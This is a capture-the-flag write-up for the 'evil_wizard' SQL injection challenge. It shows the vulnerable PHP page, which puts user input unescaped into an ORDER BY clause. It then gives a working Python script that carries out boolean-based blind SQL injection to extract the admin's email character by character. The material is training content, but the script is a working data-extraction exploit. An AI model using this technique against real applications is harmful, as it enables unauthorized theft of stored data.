# evil_wizard

```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}"; // same with hell_fire? really?
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("evil_wizard");
  highlight_file(__FILE__);
?>
```

Here also we are getting a table. We used the same script from `hell_fire`

```python
from string import printable
import requests

session = requests.Session()
cookies = {"PHPSESSID": "3v342i1kdm8ro65u8elko7ntfj"}

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=(select case when (id='admin' and length(email)={}) then 1 else 3 end)--+"
for i in range(200):
    r = requests.get(url.format(i), cookies=cookies)
    print(i, end='\r')
    if('admin' in r.text[:76]):
        l = i
        break
print("Length :", l)
url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=(select case when (id='admin' and ord(substr(email,{},1))={}) then 1 else 3 end)--+"
pw = ""
for j in range(1,l+1):
    for i in printable:
        r = requests.get(url.format(j,ord(i)), cookies=cookies)
        if('admin' in r.text[:76]):
            pw += i
            print("Password : {}".format(pw), end='\r')
            break
print("Password :", pw)

```

This will give us the admins email
